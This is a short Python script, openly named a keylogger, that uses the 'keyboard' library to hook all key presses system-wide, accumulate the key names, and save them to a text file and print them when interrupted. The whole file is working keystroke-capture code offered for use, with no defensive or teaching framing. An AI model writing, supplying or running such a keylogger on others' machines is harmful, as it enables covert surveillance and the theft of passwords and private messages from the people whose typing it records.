import keyboard

def keylogger(output_file="logged_keystrokes.txt"):
   
    try:
        # Check if the `keyboard` library is installed
        import keyboard
    except ImportError:
        raise ImportError("The 'keyboard' library is not installed. Please install it using 'pip install keyboard'.")

    #initialize empty string
    logged_keystrokes = ""

    def on_key_press(event):
     
        nonlocal logged_keystrokes

        #add pressed key to logged keystrokes
        logged_keystrokes += event.name
        
        #continue capturing keystrokes
        return True
    
    #link callback function for key press events
    keyboard.on_press(on_key_press)

    try:
        #start capturing keystrokes
        keyboard.wait()
        
    except KeyboardInterrupt:
        pass
    finally:
        
        #unhook callback function
        keyboard.unhook_all()

        #write keystrokes to file
        with open(output_file, "w") as file:
            file.write(logged_keystrokes)

    return logged_keystrokes

#useage of keylogger 
logged_keys = keylogger()
print(f"Logged keystrokes: {logged_keys}")
